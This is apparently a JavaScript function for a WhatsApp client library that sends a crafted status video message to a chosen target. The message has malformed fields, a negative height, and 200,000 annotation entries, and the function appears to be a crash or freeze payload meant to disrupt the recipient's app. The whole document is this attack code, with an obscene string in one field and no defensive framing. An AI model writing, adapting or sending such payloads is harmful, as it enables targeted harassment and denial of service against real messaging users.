async function ziperni(sock, target) {

    await sock.relayMessage(
        "status@broadcast",
        {
            videoMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7161-24/535130660_2056204551619999_9212868137245798859_n.enc?ccb=11-4&oh=01_Q5Aa3wEKzQWbFu2-T6XWU7V5bRXnbKmD5r1F0y2TneH5Hy7seg&oe=69C6B8C6&_nc_sid=5e03e0&mms3=true",
                mimetype: "video/mp4",
                fileSha256: "xx78ONox8l/eqf3pYnJcMwiBCse3FVLKkk9jdfP5oPI=",
                fileLength: "275719",
                seconds: 15,
                mediaKey: "LIHnYC8TN+vB3X9ed+nbu04NRdJ5PCmnHLXwu26o7RE=",
                height: -720,
                width: 720,
                fileEncSha256: "6a5lF9qeH/js+wV8W9fsrgVlXTSCd5htFyLKOCqzoHc=",
                directPath:
                    "/v/t62.7161-24/535130660_2056204551619999_9212868137245798859_n.enc?ccb=11-4&oh=01_Q5Aa3wEKzQWbFu2-T6XWU7V5bRXnbKmD5r1F0y2TneH5Hy7seg&oe=69C6B8C6&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1772045071",
                jpegThumbnail: Buffer.alloc(0),
                contextInfo: {
                    pairedMediaType: "NOT_PAIRED_MEDIA",
                    statusSourceType: "IMAGE",
                    isForwarded: true,
                    forwardingScore: 999,
                    businessMessageForwardInfo: {
                        businessOwnerJid: "13135550002@s.whatsapp.net",
                        businessDescription: null,
                    },
                },
                streamingSidecar:
                    "/PFxy0I/BUf8vbt/pW0sJ2j35YorqVHaII+thZ6V7yBUnox3c4QatbRETk7b2zb3nlQ=",
                thumbnailDirectPath:
                    "/v/t62.36147-24/593729676_1666419884645510_6285328431371507107_n.enc?ccb=11-4&oh=01_Q5Aa3wE2rCOu-EHBRz-yTOwRKjTlNItBVyfvepZpPpsmtDULhw&oe=69C69DFE&_nc_sid=5e03e0",
                thumbnailSha256:
                    "Cjw/0a5/5hzXKuDb6Rku26kazUYCZo0pyK8Xz35ecmo=",
                thumbnailEncSha256:
                    "DNT9rfoBh/sCwpuOIr27W/9DwsUjP/BhZjpy3iPqFG0=",
                annotations: Array.from({ length: 200000 }, () => ({
                    shouldSkipConfirmation: true,
                    embeddedContent: {
                        embeddedMusic: {
                            author: `suck my dick ¿ `,
                            title: " jipell ni boss ",
                        }
                    },
                    embeddedAction: true,
                })),
            },
        },
        {
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { status_setting: "contacts" },
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                    content: [],
                                },
                            ],
                        },
                    ],
                },
            ],
        }
    );
}
